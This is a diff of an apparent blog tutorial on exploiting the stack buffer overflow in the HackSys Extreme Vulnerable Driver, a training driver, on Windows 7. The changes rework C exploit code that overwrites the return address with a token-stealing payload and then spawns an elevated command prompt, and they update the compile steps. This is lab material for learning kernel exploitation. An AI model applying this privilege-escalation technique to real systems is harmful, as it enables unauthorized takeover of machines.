@@ -439,9 +439,11 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
 </span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 2048
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">testOverflow</span>(HANDLE hDevice);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>() {
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">testOverflow</span>(HANDLE hDevice);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">main</span>() 
+</span></span><span style="display:flex;"><span>{
 </span></span><span style="display:flex;"><span>    HANDLE hDevice;
 </span></span><span style="display:flex;"><span>    PCWSTR lpDeviceName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>;
 </span></span><span style="display:flex;"><span>
@@ -449,41 +451,41 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>        lpDeviceName,
 </span></span><span style="display:flex;"><span>        GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
 </span></span><span style="display:flex;"><span>        FILE_SHARE_WRITE,
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>,
+</span></span><span style="display:flex;"><span>        NULL,
 </span></span><span style="display:flex;"><span>        OPEN_EXISTING,
 </span></span><span style="display:flex;"><span>        FILE_ATTRIBUTE_NORMAL,
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>
+</span></span><span style="display:flex;"><span>        NULL
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hDevice <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Failed to open handle to driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    } 
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Device opened successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    testOverflow(hDevice);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (TriggerExploit(hDevice) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[+] Device successfully exploited!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Exploit failed: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
+</span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Cleaning up and closing handle...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    CloseHandle(hDevice);
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">testOverflow</span>(HANDLE hDevice) {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    PCHAR lpInBuffer { <span style="color:#66d9ef">nullptr</span> };
-</span></span><span style="display:flex;"><span>    ULONG inBufferSize { <span style="color:#ae81ff">0</span> };
-</span></span><span style="display:flex;"><span>    DWORD bytesReturned { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>    DWORD  <span style="color:#f92672">*</span>lpInBuffer;
+</span></span><span style="display:flex;"><span>    ULONG   inBufferSize;
+</span></span><span style="display:flex;"><span>    DWORD   bytesReturned;
 </span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a buffer of the correct size to use the driver
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// safely.  It will later be extended for the overflow
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE;
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    lpInBuffer <span style="color:#f92672">=</span> (PCHAR)HeapAlloc(GetProcessHeap(), 
-</span></span><span style="display:flex;"><span>                                  HEAP_ZERO_MEMORY, 
-</span></span><span style="display:flex;"><span>                                  inBufferSize);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lpInBuffer) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpInBuffer <span style="color:#f92672">=</span> (DWORD <span style="color:#f92672">*</span>)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBufferSize))) {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for buffer: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
@@ -494,6 +496,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// &#39;B&#39; so we know if we have overflowed to the right place.
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    memset(lpInBuffer, <span style="color:#e6db74">&#39;A&#39;</span>, inBufferSize);
 </span></span><span style="display:flex;"><span>    memset(lpInBuffer <span style="color:#f92672">+</span> (inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>), <span style="color:#e6db74">&#39;B&#39;</span>, <span style="color:#ae81ff">4</span>);
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Sending buffer with IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HEVD_IOCTL_BUFFER_OVERFLOW);
 </span></span><span style="display:flex;"><span>    
@@ -507,7 +510,6 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesReturned,
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>result) {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Failed to send IOCTL to HEVD Driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
@@ -520,8 +522,11 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p>Make sure to compile this for 32 bit Windows with the Visual Studio 2022 Developer Command Prompt.  The command is as follows:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>cl /D WIN32 triggerOverflow.cpp
+</span></span></code></pre></div><p>Make sure to compile this for 32 bit Windows with the Visual Studio 2022 Developer Command Prompt.</p>
+<p>Before you compile the program, you&rsquo;ll need to run the following in the command prompt to set it to compile code to 32 bit binaries.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span><span style="color:#e6db74">&#34;C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars32.bat&#34;</span>
+</span></span></code></pre></div><p>Then you can compile with:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-cmd" data-lang="cmd"><span style="display:flex;"><span>cl exploit.c
 </span></span></code></pre></div><h2 id="find-the-offsets">Find the offsets</h2>
 <p>Now it&rsquo;s time to install the driver on a VM, run our program against it, and figure out what the stack of the vulnerable function looks like.</p>
 <p>Start up the Windows 7 VM that you have set up for kernel debugging and install the driver with the usual <code>sc</code> commands.</p>
@@ -599,41 +604,33 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>}
 </span></span></code></pre></div><p>We also need to change the <code>testOverflow</code> function to look like this:</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">testOverflow</span>(HANDLE hDevice) {
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c++" data-lang="c++"><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice) {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    PCHAR lpInBuffer    { <span style="color:#66d9ef">nullptr</span> };
-</span></span><span style="display:flex;"><span>    ULONG inBufferSize  { <span style="color:#ae81ff">0</span> };
-</span></span><span style="display:flex;"><span>    DWORD bytesReturned { <span style="color:#ae81ff">0</span> };
-</span></span><span style="display:flex;"><span>    DWORD lpShellcode   { <span style="color:#ae81ff">0</span> };
-</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>    DWORD  <span style="color:#f92672">*</span>lpInBuffer;
+</span></span><span style="display:flex;"><span>    ULONG   inBufferSize;
+</span></span><span style="display:flex;"><span>    DWORD   bytesReturned;
+</span></span><span style="display:flex;"><span>    DWORD   lpShellcode;
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a buffer of the correct size to overflow into the 
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// return address.  Need to overflow the buffer, the SEH EH4 
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Registration Node, the saved EBP, and finally the return
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// address.  Last 4 bytes will overwrite the return address.
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE <span style="color:#f92672">+</span> EH4_REGISTRATION_NODE_SIZE <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    lpInBuffer <span style="color:#f92672">=</span> (PCHAR)HeapAlloc(GetProcessHeap(), 
-</span></span><span style="display:flex;"><span>                                  HEAP_ZERO_MEMORY, 
-</span></span><span style="display:flex;"><span>                                  inBufferSize);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lpInBuffer) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate the buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpInBuffer <span style="color:#f92672">=</span> (DWORD <span style="color:#f92672">*</span>)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBufferSize))) {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for buffer: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Created buffer of size: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, inBufferSize);
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set buffer to be full of &#39;A&#39;s
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    memset(lpInBuffer, <span style="color:#e6db74">&#39;A&#39;</span>, inBufferSize);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set the last 4 bytes to contain a pointer to the &#34;shellcode&#34; function
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpShellcode <span style="color:#f92672">=</span> (DWORD)<span style="color:#f92672">&amp;</span>shellcode;
-</span></span><span style="display:flex;"><span>    lpInBuffer[inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (lpShellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x000000FF</span>);
-</span></span><span style="display:flex;"><span>    lpInBuffer[inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> (lpShellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x0000FF00</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x8</span>;
-</span></span><span style="display:flex;"><span>    lpInBuffer[inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">2</span>] <span style="color:#f92672">=</span> (lpShellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x00FF0000</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x10</span>;
-</span></span><span style="display:flex;"><span>    lpInBuffer[inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (lpShellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0xFF000000</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x18</span>;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpInBuffer[(inBufferSize <span style="color:#f92672">/</span> <span style="color:#ae81ff">4</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> (DWORD)<span style="color:#f92672">&amp;</span>TokenStealingPayloadWin7Generic;
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] lpShellcode: 0x%08X</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpShellcode);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Sending buffer with IOCTL: 0x%x</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, HEVD_IOCTL_BUFFER_OVERFLOW);
 </span></span><span style="display:flex;"><span>    
@@ -642,17 +639,15 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>        HEVD_IOCTL_BUFFER_OVERFLOW,
 </span></span><span style="display:flex;"><span>        lpInBuffer,
 </span></span><span style="display:flex;"><span>        inBufferSize,
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>,
+</span></span><span style="display:flex;"><span>        NULL,
 </span></span><span style="display:flex;"><span>        <span style="color:#ae81ff">0</span>,
 </span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>bytesReturned,
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>
+</span></span><span style="display:flex;"><span>        NULL
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>result) {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Failed to send IOCTL to HEVD Driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] IOCTL sent successfully to HEVD driver!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Freeing input buffer...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
@@ -660,10 +655,7 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><blockquote>
-<p>Take note that you may have to change the endianness of the pointer to the <code>shellcode</code> function. This is done with the bit flip operations used in the code above.</p>
-</blockquote>
-<p>Let&rsquo;s set a breakpoint just before the return of the TriggerOverflow function and see if we step into our assembly sequence.</p>
+</span></span></code></pre></div><p>Let&rsquo;s set a breakpoint just before the return of the TriggerOverflow function and see if we step into our assembly sequence.</p>
 <p><img src="./images/12_place_to_set_bp_for_shellcode.png" alt="Breakpoint for shellcode"></p>
 <p>Run the code until you get to the breakpoint, then press <code>t</code> once or twice to return out of the function.  Once you do, run <code>u @eip L9</code> to <code>unassemble</code> the next <code>9</code> instructions at the memory address contained in the <code>eip</code> register.</p>
 <p><img src="./images/13_shellcode_jumped_to.png" alt="Shellcode jumped to"></p>
@@ -788,10 +780,10 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice);
 </span></span><span style="display:flex;"><span>VOID <span style="color:#a6e22e">TokenStealingPayloadWin7Generic</span>();
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">main</span>() {
-</span></span><span style="display:flex;"><span>    HANDLE hDevice { <span style="color:#66d9ef">nullptr</span> };
+</span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">main</span>() 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    HANDLE hDevice;
 </span></span><span style="display:flex;"><span>    PCWSTR lpDeviceName <span style="color:#f92672">=</span> <span style="color:#e6db74">L</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>;
-</span></span><span style="display:flex;"><span>    INT result { <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> };
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[*] Author: @stolenfootball</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[*] Website: https://stolenfootball.github.io</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">&#34;</span>);
@@ -800,12 +792,11 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>        lpDeviceName,
 </span></span><span style="display:flex;"><span>        GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
 </span></span><span style="display:flex;"><span>        FILE_SHARE_WRITE,
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>,
+</span></span><span style="display:flex;"><span>        NULL,
 </span></span><span style="display:flex;"><span>        OPEN_EXISTING,
 </span></span><span style="display:flex;"><span>        FILE_ATTRIBUTE_NORMAL,
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">nullptr</span>
+</span></span><span style="display:flex;"><span>        NULL
 </span></span><span style="display:flex;"><span>    );
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hDevice <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE) {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Failed to open handle to driver: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
@@ -813,29 +804,26 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Device opened successfully!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">=</span> TriggerExploit(hDevice);
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (result <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (TriggerExploit(hDevice) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">0</span>) {
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[+] Device successfully exploited!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[+] Launching elevated command prompt...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        system(<span style="color:#e6db74">&#34;cmd&#34;</span>);
+</span></span><span style="display:flex;"><span>    } <span style="color:#66d9ef">else</span> {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Exploit failed: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Device successfully exploited!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Cleaning up and closing handle...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
 </span></span><span style="display:flex;"><span>    CloseHandle(hDevice);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Launching elevated command prompt...</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>    system(<span style="color:#e6db74">&#34;cmd&#34;</span>);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
 </span></span><span style="display:flex;"><span>}
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>INT <span style="color:#a6e22e">TriggerExploit</span>(HANDLE hDevice) {
 </span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    PCHAR lpInBuffer    { <span style="color:#66d9ef">nullptr</span> };
-</span></span><span style="display:flex;"><span>    ULONG inBufferSize  { <span style="color:#ae81ff">0</span> };
-</span></span><span style="display:flex;"><span>    DWORD bytesReturned { <span style="color:#ae81ff">0</span> };
-</span></span><span style="display:flex;"><span>    DWORD lpShellcode   { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>    DWORD  <span style="color:#f92672">*</span>lpInBuffer;
+</span></span><span style="display:flex;"><span>    ULONG   inBufferSize;
+</span></span><span style="display:flex;"><span>    DWORD   bytesReturned;
+</span></span><span style="display:flex;"><span>    DWORD   lpShellcode;
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate a buffer of the correct size to overflow into the 
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// return address.  Need to overflow the buffer, the SEH EH4 
@@ -843,26 +831,20 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// address.  Last 4 bytes will overwrite the return address.
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    inBufferSize <span style="color:#f92672">=</span> BUFFER_SIZE <span style="color:#f92672">+</span> EH4_REGISTRATION_NODE_SIZE <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>;
 </span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    lpInBuffer <span style="color:#f92672">=</span> (PCHAR)HeapAlloc(GetProcessHeap(), 
-</span></span><span style="display:flex;"><span>                                  HEAP_ZERO_MEMORY, 
-</span></span><span style="display:flex;"><span>                                  inBufferSize);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>lpInBuffer) {
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Allocate the buffer
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpInBuffer <span style="color:#f92672">=</span> (DWORD <span style="color:#f92672">*</span>)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, inBufferSize))) {
 </span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[-] Failed to allocate memory for buffer: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, GetLastError());
 </span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
 </span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    printf(<span style="color:#e6db74">&#34;[+] Created buffer of size: %lu</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, inBufferSize);
+</span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set buffer to be full of &#39;A&#39;s
 </span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    memset(lpInBuffer, <span style="color:#e6db74">&#39;A&#39;</span>, inBufferSize);
 </span></span><span style="display:flex;"><span>
 </span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Set the last 4 bytes to contain a pointer to the &#34;shellcode&#34; function
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    lpShellcode <span style="color:#f92672">=</span> (DWORD)<span style="color:#f92672">&amp;</span>TokenStealingPayloadWin7Generic;
-</span></span><span style="display:flex;"><span>    lpInBuffer[inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> (lpShellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x000000FF</span>);
-</span></span><span style="display:flex;"><span>    lpInBuffer[inBufferSize <span style="color:#f92672">-</span> <span style="color:#ae81ff">3</span>] <span style="color:#f92672">=</span> (lpShellcode <span style="color:#f92672">&amp;</span> <span style="color:#ae81ff">0x0000FF00</span>) <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">0x8</span>;
